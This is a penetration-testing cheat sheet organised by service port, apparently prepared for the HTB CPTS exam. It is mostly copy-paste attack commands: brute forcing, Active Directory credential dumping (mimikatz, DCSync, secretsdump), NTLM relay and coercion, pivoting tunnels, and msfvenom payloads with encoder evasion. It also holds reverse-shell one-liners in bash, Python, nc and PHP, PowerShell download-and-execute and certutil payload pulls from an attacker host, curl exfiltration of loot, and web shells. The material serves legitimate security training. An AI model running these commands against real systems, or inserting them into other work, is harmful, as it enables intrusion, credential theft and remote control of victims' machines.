# CPTS Tools Cheat Sheet

> Service-first lookup. Open port → jump to section → paste one-liner → adjust placeholders.
> Placeholders: `<ip>`, `<user>`, `<pass>`, `<domain>`, `<dc>`, `<hash>`, `<wordlist>`

## Table of Contents
- [Discovery & Recon](#discovery--recon)
- [Network Services](#network-services)
  - [FTP (21)](#ftp-21)
  - [SSH (22)](#ssh-22)
  - [SMTP (25 / 465 / 587)](#smtp-25--465--587)
  - [DNS (53)](#dns-53)
  - [POP3 / IMAP (110/995 / 143/993)](#pop3--imap-110995--143993)
  - [SMB / NetBIOS (139 / 445)](#smb--netbios-139--445)
  - [SNMP (161/udp)](#snmp-161udp)
  - [LDAP (389 / 636 / 3268)](#ldap-389--636--3268)
  - [IPMI (623/udp)](#ipmi-623udp)
  - [MSSQL (1433)](#mssql-1433)
  - [Oracle TNS (1521)](#oracle-tns-1521)
  - [NFS (2049)](#nfs-2049)
  - [MySQL (3306)](#mysql-3306)
  - [RDP (3389)](#rdp-3389)
  - [WinRM (5985 / 5986)](#winrm-5985--5986)
- [Web (80 / 443 / 8080 / 8443)](#web-80--443--8080--8443)
- [Active Directory](#active-directory)
- [Password Cracking](#password-cracking)
- [Pivoting & Tunneling](#pivoting--tunneling)
- [File Transfers](#file-transfers)
- [Shells & Payload Generation](#shells--payload-generation)
- [Vulnerability Scanners](#vulnerability-scanners)

---

# Discovery & Recon

## Host discovery / port scanning
- `nmap -sV -sC -p- --min-rate 5000 <ip>` — full TCP service scan
- `nmap -sU --top-ports 100 <ip>` — UDP top 100
- `nmap -p- -T4 --open <ip>` — quick wide TCP, only open ports
- `rustscan -a <ip> -- -sV -sC` — fast all-ports, hand off to nmap
- `masscan -p1-65535 <ip> --rate 10000 -e tun0` — fastest wide sweep
- `autorecon <ip>` — automated multi-tool enumeration
- `fping -agq 10.10.10.0/24` — live host sweep

---

# Network Services

## FTP (21)
- `nmap --script "ftp-* and not brute" -p21 <ip>` — banner + anon + bounce check
- `ftp <ip>` then `anonymous` / `anonymous` — anonymous login
- `lftp -u <user>,<pass> <ip>` — better interactive client
- `wget -m --no-passive ftp://anonymous@<ip>` — mirror entire share
- `curl -k 'ftps://<ip>' --ssl -v` — explicit FTPS test
- `hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://<ip>`

## SSH (22)
- `ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa <user>@<ip>` — force legacy algos
- `ssh -i id_rsa <user>@<ip>` — key auth
- `ssh -p <port> <user>@<ip>` — non-default port
- `hydra -L users.txt -P pass.txt ssh://<ip>:<port>`
- `ssh2john id_rsa > id_rsa.hash && john --wordlist=rockyou.txt id_rsa.hash` — crack passphrase

## SMTP (25 / 465 / 587)
- `nmap --script "smtp-* and not brute" -p25 <ip>`
- `smtp-user-enum -M VRFY -U users.txt -t <ip>` — VRFY/EXPN/RCPT user enum
- `smtp-user-enum -M RCPT -U users.txt -D <domain> -t <ip>`
- `swaks --to victim@<domain> --from attacker@x --server <ip>` — send test mail
- `telnet <ip> 25` → `HELO x` / `VRFY <user>` — manual probe

## DNS (53)
- `dig axfr <domain> @<ns>` — zone transfer (AXFR)
- `dig ANY <domain> @<ns>` / `dig TXT <domain> @<ns>`
- `dnsenum --dnsserver <ip> <domain>`
- `dnsrecon -d <domain> -t axfr,brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
- `fierce --domain <domain>`
- `host -l <domain> <ns>` — quick zone transfer test

## POP3 / IMAP (110/995 / 143/993)
- `nmap --script "pop3-* or imap-*" -p110,143,993,995 <ip>`
- `openssl s_client -connect <ip>:993` — manual IMAPS
- `openssl s_client -connect <ip>:995` — manual POP3S
- `curl -k 'imaps://<ip>' --user '<user>:<pass>' -v`
- `hydra -L users.txt -P pass.txt pop3://<ip>`

## SMB / NetBIOS (139 / 445)
- `nxc smb <ip>` — banner + signing + null sess (modern crackmapexec fork)
- `enum4linux-ng -A -C <ip>` — full enum + checks
- `smbclient -N -L //<ip>/` — anon share list
- `smbclient //<ip>/<share> -U '<user>%<pass>'`
- `smbmap -H <ip> -u '<user>' -p '<pass>' -r` — recursive share walk
- `rpcclient -U "" -N <ip>` then `enumdomusers`, `queryuser <rid>`, `lsaenumsid`
- `nxc smb <ip> -u <user> -p <pass> --shares --pass-pol --users --groups`
- `nxc smb <ip> -u <user> -H <NThash>` — Pass-the-Hash auth
- `impacket-psexec <domain>/<user>:<pass>@<ip>` — auth'd code exec (svc install)
- `impacket-smbexec <domain>/<user>:<pass>@<ip>` — quieter alternative
- `impacket-wmiexec <domain>/<user>:<pass>@<ip>` — WMI-based exec
- `responder -I tun0 -wd` — capture NTLMv2 on local segment

## SNMP (161/udp)
- `nmap -sU -p161 --script snmp-* <ip>`
- `snmpwalk -v2c -c public <ip>` / `snmpwalk -v1 -c public <ip>`
- `snmpwalk -v2c -c public <ip> 1.3.6.1.2.1.25.4.2.1.2` — running processes
- `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <ip>` — community brute
- `braa public@<ip>:.1.3.6.*` — bulk OID walk (very fast)

## LDAP (389 / 636 / 3268)
- `nmap -p389,636,3268,3269 --script ldap-* <ip>`
- `ldapsearch -x -H ldap://<ip> -s base namingcontexts` — base DN discovery
- `ldapsearch -x -H ldap://<ip> -b "DC=<dom>,DC=<tld>" -D '<user>@<domain>' -w '<pass>'` — auth'd dump
- `ldapsearch -x -H ldap://<ip> -b "DC=<dom>,DC=<tld>" "(objectClass=user)" sAMAccountName description`
- `nxc ldap <ip> -u <user> -p <pass> --users --groups --asreproast hashes.txt`
- `windapsearch -d <domain> -u <user> -p <pass> --dc-ip <dc> -m all`

## IPMI (623/udp)
- `nmap -sU --script ipmi-version,ipmi-cipher-zero -p623 <ip>`
- `msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <ip>; run"` — RAKP hash dump
- `hashcat -m 7300 ipmi.hash rockyou.txt` — crack RAKP HMAC

## MSSQL (1433)
- `nmap -p1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info <ip>`
- `impacket-mssqlclient <domain>/<user>:<pass>@<ip> -windows-auth` — interactive shell
- `nxc mssql <ip> -u <user> -p <pass> -q "SELECT @@version"`
- `nxc mssql <ip> -u <user> -p <pass> -x "whoami"` — xp_cmdshell
- `nxc mssql <ip> -u <user> -p <pass> -M mssql_priv` — priv-esc enumeration
- Inside `mssqlclient`: `enable_xp_cmdshell`, `xp_cmdshell whoami`, `EXEC sp_linkedservers`

## Oracle TNS (1521)
- `nmap -p1521 --script oracle-sid-brute,oracle-brute <ip>`
- `odat all -s <ip> -p 1521` — full Oracle attack toolkit
- `odat passwordguesser -s <ip> -p 1521 -d <SID> --accounts-file accounts.txt`
- `sqlplus <user>/<pass>@<ip>:1521/<SID>`

## NFS (2049)
- `showmount -e <ip>` — list exports
- `nmap --script nfs-ls,nfs-statfs,nfs-showmount -p2049 <ip>`
- `sudo mount -t nfs <ip>:/share /mnt/nfs -o nolock,vers=3`
- `sudo mount -t nfs -o vers=4 <ip>:/ /mnt/nfs` — try root export

## MySQL (3306)
- `nmap -p3306 --script mysql-* <ip>`
- `mysql -u <user> -p<pass> -h <ip>` — interactive
- `mysql -u root -h <ip> -e "SELECT @@version; SHOW DATABASES;"`
- `hydra -L users.txt -P pass.txt mysql://<ip>`

## RDP (3389)
- `nmap -p3389 --script rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info <ip>`
- `xfreerdp /v:<ip> /u:<user> /p:'<pass>' /dynamic-resolution /cert:ignore /drive:share,/tmp`
- `xfreerdp /v:<ip> /u:<user> /pth:<NThash>` — Pass-the-Hash
- `rdesktop -u <user> -p <pass> <ip>` — older fallback
- `hydra -L users.txt -P pass.txt rdp://<ip>`
- `crowbar -b rdp -s <ip>/32 -U users.txt -C pass.txt` — slow but reliable

## WinRM (5985 / 5986)
- `nxc winrm <ip> -u <user> -p <pass>` — check exec rights
- `evil-winrm -i <ip> -u <user> -p '<pass>'`
- `evil-winrm -i <ip> -u <user> -H <NThash>` — Pass-the-Hash
- `evil-winrm -i <ip> -u <user> -p '<pass>' -s ./scripts/ -e ./exes/` — auto load PS/EXE

---

# Web (80 / 443 / 8080 / 8443)

## Discovery
- `whatweb -a 3 http://<ip>` — tech fingerprinting
- `wappalyzer <url>` (browser ext or CLI) — framework detection
- `nuclei -u http://<ip> -severity medium,high,critical` — templated CVE check
- `nikto -h http://<ip>` — classic web vuln scanner

## Content / vhost / param fuzzing — **ffuf**
- `ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://<ip>/FUZZ -ic -e .php,.html,.txt`
- `ffuf -w subdomains.txt:FUZZ -u http://<ip> -H "Host: FUZZ.<domain>" -fs <baselen>` — vhost
- `ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u "http://<ip>/page?FUZZ=test" -fs <baselen>` — param mining
- `ffuf -w pass.txt:FUZZ -X POST -d "user=admin&pass=FUZZ" -u http://<ip>/login -fr "invalid"` — login fuzz
- `gobuster dir -u http://<ip> -w wordlist -x php,txt,html -k`
- `gobuster vhost -u http://<ip> -w subs.txt --append-domain`
- `feroxbuster -u http://<ip> -w wordlist -x php,txt -d 3`
- `wfuzz -c -z file,wordlist --hc 404 http://<ip>/FUZZ`

## CMS / framework
- `wpscan --url http://<ip> --enumerate u,p,t --api-token <tok>`
- `wpscan --url http://<ip> --passwords rockyou.txt --usernames admin` — login brute
- `joomscan -u http://<ip>`
- `droopescan scan drupal -u http://<ip>`
- `cmsmap -F http://<ip>`

## Proxies & request crafting
- **Burp Suite** — Proxy, Repeater, Intruder (sniper / pitchfork / cluster bomb), Decoder, Comparer, Match & Replace, Collaborator
- **OWASP ZAP** — Manual Explore, AJAX Spider, Fuzzer, Active Scan, HUD
- `curl -sk -b 'PHPSESSID=...' -X POST -d 'a=1&b=2' http://<ip>/x.php` — replay session
- `mitmproxy -p 8080` — TUI alternative for transparent inspection

## Login brute force (HTTP forms)
- `hydra -L users.txt -P pass.txt <ip> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=invalid"`
- `hydra -l admin -P rockyou.txt <ip> http-get-form "/admin/index.php:user=^USER^&pass=^PASS^:S=302"`
- `medusa -h <ip> -U users.txt -P pass.txt -M http -m FORM:"...":F=Invalid`

## SQL Injection
- `sqlmap -u "http://<ip>/x.php?id=1" --batch --dbs`
- `sqlmap -r request.txt --batch --level 5 --risk 3 --dump`
- `sqlmap -u "http://<ip>/x.php?id=1" --os-shell` — RCE if FILE/stacked allowed
- `sqlmap -u "http://<ip>/x.php?id=1" --technique=BEUSTQ --threads=10`
- `sqlmap --eval="import hashlib; hash=hashlib.md5(id).hexdigest()" ...` — preprocess params

## XSS / SSTI / other web checks
- `XSStrike -u "http://<ip>/x?q=1"` — context-aware XSS
- `tplmap -u "http://<ip>/x?name=1"` — SSTI detection/exploit
- `dalfox url "http://<ip>/x?q=1"` — fast XSS scanner

---

# Active Directory

## Enumeration (unauth → auth)
- `nxc smb <dc> -u '' -p '' --users` / `--shares` / `--pass-pol`
- `nxc smb <dc> -u guest -p ''` — guest probe
- `kerbrute userenum -d <domain> --dc <dc> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users`
- `kerbrute bruteuser -d <domain> --dc <dc> rockyou.txt <user>`
- `ldapsearch -x -H ldap://<dc> -b "DC=<dom>,DC=<tld>" -D '<user>@<domain>' -w '<pass>' "(objectClass=user)"`
- `bloodhound-python -d <domain> -dc <dc> -c All -u <user> -p '<pass>' --zip` — Linux collector
- `SharpHound.exe -c All --zipfilename out.zip` — Windows collector
- `nxc ldap <dc> -u <user> -p <pass> --trusted-for-delegation --asreproast asrep.hash --kerberoasting spn.hash`

## AS-REP Roast / Kerberoast / Delegation
- `impacket-GetNPUsers <domain>/ -dc-ip <dc> -no-pass -usersfile users.txt -format hashcat -outputfile asrep.hash`
- `impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <dc> -request -outputfile spn.hash`
- `impacket-getST -spn <spn> -impersonate Administrator <domain>/<user>:'<pass>'` — S4U2Self/Proxy
- `impacket-findDelegation <domain>/<user>:'<pass>' -dc-ip <dc>` — list delegations
- `hashcat -m 18200 asrep.hash rockyou.txt` — AS-REP
- `hashcat -m 13100 spn.hash rockyou.txt` — Kerberos TGS

## Credential dumping
- `impacket-secretsdump <domain>/<user>:'<pass>'@<dc>` — remote DCSync
- `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL` — offline NTDS
- `impacket-secretsdump -sam SAM -system SYSTEM LOCAL` — offline SAM
- `mimikatz` → `privilege::debug` → `sekurlsa::logonpasswords`
- `mimikatz` → `lsadump::dcsync /user:<dom>\krbtgt` — DCSync krbtgt
- `mimikatz` → `lsadump::sam` / `lsadump::secrets` / `vault::cred`
- `Rubeus.exe dump` / `Rubeus.exe asktgt /user:<u> /password:<p> /nowrap`
- `procdump.exe -accepteula -ma lsass.exe lsass.dmp` → offline `mimikatz # sekurlsa::minidump lsass.dmp`

## Pass-the-Hash / Ticket / Key / Certificate
- `impacket-psexec <domain>/<user>@<ip> -hashes :<NThash>` — PtH RCE
- `impacket-wmiexec <domain>/<user>@<ip> -hashes :<NThash>`
- `evil-winrm -i <ip> -u <user> -H <NThash>`
- `xfreerdp /v:<ip> /u:<user> /pth:<NThash>`
- `KRB5CCNAME=ticket.ccache impacket-psexec -k -no-pass <domain>/<user>@<dc>` — PtT (Linux)
- `mimikatz # kerberos::ptt ticket.kirbi` — PtT (Windows)
- `mimikatz # sekurlsa::pth /user:<u> /domain:<d> /ntlm:<hash> /run:cmd` — PtH spawn
- `certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc> -vulnerable -stdout` — ADCS vuln scan
- `certipy req -u <user>@<domain> -p '<pass>' -ca '<CA>' -template <tmpl> -upn Administrator@<domain>` — ESC1/ESC8
- `certipy auth -pfx admin.pfx` — get NT hash / TGT from cert
- `certipy shadow auto -u <user>@<domain> -p '<pass>' -account <target>` — shadow credentials

## Relay & coercion
- `responder -I tun0 -wd` — capture NTLMv2 + WPAD/LLMNR/NBT-NS
- `responder -I tun0 -A` — analyze mode (no poisoning)
- `impacket-ntlmrelayx -t ldaps://<dc> --escalate-user <user>` — RBCD/shadow via LDAPS
- `impacket-ntlmrelayx -t smb://<ip> -c "powershell -enc ..." -smb2support` — relay to SMB
- `impacket-ntlmrelayx -t http://<ip>/certsrv/certfnsh.asp --adcs -smb2support` — ESC8 ADCS relay
- `PetitPotam.py -u <user> -p <pass> <listener-ip> <target>` — MS-EFSRPC coercion
- `coercer coerce -u <user> -p <pass> -t <target> -l <listener>` — all-in-one coercion
- `printerbug.py <domain>/<user>:<pass>@<target> <listener>` — MS-RPRN coercion

## Useful frameworks (Windows-side)
- **PowerView.ps1** — `Get-DomainUser`, `Get-DomainGroup`, `Find-LocalAdminAccess`, `Get-DomainController`, `Invoke-ACLScanner`
- **PowerSploit / PowerUp** — `Invoke-AllChecks` for local priv-esc
- **AD Module (RSAT)** — `Get-ADUser -Filter *`, `Get-ADComputer -Filter * -Properties *`
- **ADSearch.exe** — `ADSearch.exe --search "(objectCategory=user)" --attributes samaccountname`
- **Snaffler** — `Snaffler.exe -s -d <domain> -o snaffler.log` — share content hunting

---

# Password Cracking

## Hashcat — modes you'll need
- `hashcat -m <mode> <hashfile> <wordlist> [rules]`
  - `0`   MD5
  - `100` SHA1
  - `1000` NTLM
  - `1800` sha512crypt ($6$, Linux shadow)
  - `5600` NetNTLMv2 (Responder)
  - `13100` Kerberos TGS-REP (Kerberoast)
  - `18200` Kerberos AS-REP (AS-REP roast)
  - `1300` SHA-224 / `1400` SHA-256 / `1700` SHA-512
  - `2500` WPA-EAPOL-PBKDF2 / `22000` WPA-PBKDF2-PMKID+EAPOL
- `hashcat -m 1000 hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule` — rule-based
- `hashcat -m 1000 hash -a 3 ?u?l?l?l?l?d?d?d` — mask attack
- `hashcat --show -m 1000 hash` — list cracked entries from potfile

## John the Ripper
- `john --wordlist=rockyou.txt hashfile --format=<fmt>` — auto-detects if `--format` omitted
- `john --rules=KoreLogic --wordlist=rockyou.txt hashes`
- `john --show hashes`
- `*2john` helpers: `zip2john`, `rar2john`, `ssh2john`, `pdf2john.pl`, `keepass2john`, `office2john.py`, `7z2john.pl`

## Online password attacks (spraying & stuffing)
- `nxc smb hosts.txt -u users.txt -p 'Spring2024!' --continue-on-success` — SMB spray
- `nxc winrm <ip> -u users.txt -p pass.txt --continue-on-success`
- `kerbrute passwordspray -d <domain> --dc <dc> users.txt 'Spring2024!'`
- `hydra -L users.txt -p 'Welcome1' ssh://<ip> -t 4` — single-password spray
- `medusa -h <ip> -U users.txt -P pass.txt -M ssh -t 4`

## Wordlist generation
- `cewl http://<ip> -m 6 -w cewl.txt` — site-scraped wordlist
- `crunch 8 8 -t Comp@ny%%%% -o crunch.txt` — pattern generator
- `hashcat --stdout rockyou.txt -r best64.rule > mutated.txt` — rule-mutated list

---

# Pivoting & Tunneling

## SSH-based
- `ssh -L <lport>:<target>:<rport> <user>@<jump>` — local forward (attacker:lport → target:rport)
- `ssh -R <rport>:<target>:<lport> <user>@<jump>` — remote forward (callback)
- `ssh -D 9050 <user>@<jump>` + `proxychains <tool>` — SOCKS dynamic
- `sshuttle -r <user>@<jump> 172.16.0.0/12 10.10.0.0/16` — transparent VPN-like, no SOCKS config
- `sshuttle -r <user>@<jump> 0.0.0.0/0 --dns` — full tunnel + DNS

## Chisel (TCP over HTTP, single binary)
- attacker: `./chisel server -p 8080 --reverse --socks5`
- victim:   `./chisel client <attacker>:8080 R:socks` — reverse SOCKS
- victim:   `./chisel client <attacker>:8080 R:8888:<target>:80` — reverse port forward

## Ligolo-ng (modern, fast, tun-based)
- attacker: `sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up && sudo ip route add <target-cidr> dev ligolo`
- attacker: `./proxy -selfcert`
- agent (target): `./agent -connect <attacker>:11601 -ignore-cert`
- inside proxy: `session` → `start` → reach targets natively (no proxychains needed)

## Socat / plink / netsh
- `socat TCP-LISTEN:<lport>,fork,reuseaddr TCP:<target>:<rport>` — port relay
- `socat TCP-LISTEN:<lport>,fork OPENSSL:<target>:<rport>,verify=0` — TLS relay
- `plink.exe -ssh -D 9050 -N -batch -pw <pass> <user>@<jump>` — Windows SSH SOCKS (PuTTY)
- `netsh interface portproxy add v4tov4 listenport=<l> listenaddress=0.0.0.0 connectport=<r> connectaddress=<target>` — Win portproxy
- `netsh advfirewall firewall add rule name="fwd" dir=in action=allow protocol=TCP localport=<l>` — open inbound

## Metasploit / Meterpreter
- `meterpreter > run autoroute -s 10.10.10.0/24` (or `route add 10.10.10.0 255.255.255.0 <session>`)
- `use auxiliary/server/socks_proxy` → `set SRVPORT 9050` → `run` — SOCKS pivot via Meterpreter routes
- `portfwd add -l <lport> -p <rport> -r <target>` — Meterpreter port forward

## Misc
- `proxychains4 -q <tool> <args>` — wrap any tool through SOCKS (configure `/etc/proxychains4.conf`)
- `dnscat2-server <listen-domain>` + victim `dnscat2 <listen-domain>` — DNS C2 when only 53/udp leaves the net
- `rpivot` — Python web-server-friendly pivot (legacy, but in HTB modules)

---

# File Transfers

## Linux victim → attacker (or vice versa)
- attacker: `python3 -m http.server 80` / `updog -p 80` (auth + upload)
- victim: `wget http://<attacker>/file -O /tmp/file`
- victim: `curl -o /tmp/file http://<attacker>/file`
- victim: `curl -X POST -F 'file=@/tmp/loot.tar' http://<attacker>:5000/upload` — to updog

## Attacker → Windows victim
- attacker: `impacket-smbserver share /tmp/loot -smb2support -username t -password t`
- victim PowerShell: `IEX (New-Object Net.WebClient).DownloadString('http://<attacker>/x.ps1')`
- victim PowerShell: `Invoke-WebRequest http://<attacker>/x.exe -OutFile C:\Temp\x.exe -UseBasicParsing`
- victim PowerShell: `(New-Object Net.WebClient).DownloadFile('http://<attacker>/x.exe','C:\Temp\x.exe')`
- victim cmd: `certutil -urlcache -split -f http://<attacker>/x.exe C:\Temp\x.exe`
- victim cmd: `copy \\<attacker>\share\x.exe C:\Temp\` — SMB pull (auth via `net use`)
- victim cmd: `bitsadmin /transfer job http://<attacker>/x.exe C:\Temp\x.exe`

## Encoded / covert
- `base64 -w 0 file` → paste, decode with `base64 -d` (Linux) or `certutil -decode in.b64 out` (Windows)
- `cat file | xxd -p -c 0` / `xxd -r -p > file` — hex round trip
- `scp -P <port> file <user>@<ip>:/path` / `sftp <user>@<ip>` — over SSH
- `impacket-smbclient <domain>/<user>:<pass>@<ip>` then `put` / `get`
- Steg / disguised: `exiftool -Comment=@payload.b64 image.jpg` (transfer disguise)

## Inside Meterpreter
- `meterpreter > upload /tmp/x.exe C:\\Temp\\`
- `meterpreter > download C:\\Users\\Administrator\\Desktop\\flag.txt`

---

# Shells & Payload Generation

## msfvenom — common payloads
- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<p> -f exe -o sh.exe`
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<p> -f exe -o sh.exe` — staged-less Windows shell
- `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<p> -f elf -o sh`
- `msfvenom -p php/reverse_php LHOST=<ip> LPORT=<p> -f raw > sh.php`
- `msfvenom -p cmd/unix/reverse_bash LHOST=<ip> LPORT=<p> -f raw` — bash one-liner
- `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=443 -f exe -o sh.exe` — TLS C2
- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<p> -f war -o sh.war` — JSP/WAR for Tomcat
- `msfvenom -p osx/x64/shell_reverse_tcp LHOST=<ip> LPORT=<p> -f macho -o sh`
- Encoder: `msfvenom -p ... -e x86/shikata_ga_nai -i 10 -f exe` — multi-pass encode

## Listeners
- `nc -lvnp <p>` / `rlwrap nc -lvnp <p>` — basic / readline
- `ncat -lvnp <p> --ssl` — TLS listener
- `pwncat-cs -lp <p>` — auto-upgrade TTY, file transfer, post-exploit
- Metasploit `multi/handler` — `use exploit/multi/handler; set PAYLOAD <same-as-venom>; set LHOST <ip>; set LPORT <p>; run -j`

## TTY upgrade after catching shell
1. `python3 -c 'import pty;pty.spawn("/bin/bash")'`
2. `Ctrl+Z`
3. `stty raw -echo;fg` then `Enter` `Enter`
4. `export TERM=xterm-256color; export SHELL=bash`
5. `stty rows 50 cols 200` (match your terminal)

## Reverse shell one-liners (memorize one per OS)
- Bash:   `bash -c 'bash -i >& /dev/tcp/<ip>/<p> 0>&1'`
- Python: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<ip>",<p>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("bash")'`
- PowerShell (Nishang style): `IEX(IWR http://<attacker>/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port <p>`
- nc (mkfifo): `mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <ip> <p> > /tmp/f`
- PHP: `php -r '$s=fsockopen("<ip>",<p>);exec("sh <&3 >&3 2>&3");'`

## Web shells
- `laudanum` (Kali: `/usr/share/laudanum/`) — pre-built PHP/ASP/JSP shells
- `antak-webshell` (ASPX) — interactive Windows web shell
- `AntSword` — multi-language client (php/asp/jsp/python webshells), tunneling support
- `weevely generate <pass> sh.php` then `weevely http://<ip>/sh.php <pass>` — stealthy PHP shell

---

# Vulnerability Scanners

- **Nessus** — Web UI on `https://localhost:8834`. Policies: "Basic Network Scan", "Advanced Scan", "Web Application Tests", "Credentialed Patch Audit"
- **OpenVAS / GVM** — Web UI on `https://localhost:9392`. Configs: "Full and fast", "Full and fast ultimate". CLI: `gvm-cli`
- `nuclei -t cves/ -u http://<ip>` — fast templated CVE check
- `nuclei -u http://<ip> -t exposed-panels/,vulnerabilities/,misconfiguration/`
- `searchsploit <product> <version>` — local Exploit-DB lookup
- `searchsploit -m <id>` — copy exploit locally; `-x <id>` to view
- `msfconsole -q -x "db_nmap -sV <ip>; vulns"` — auto-pull vuln data into MSF DB
- `wpscan --url http://<ip> --api-token <tok>` — WordPress CVE check
- `legion` / `sparta` — GUI multi-tool orchestrators (auto-runs nmap + scripts)

---

> **Exam workflow reminder:** Nmap → identify port → jump to section above → run enum tools → grab creds/foothold → escalate locally → pivot to next subnet → repeat. Document every command and screenshot **as you go** — the report is graded.
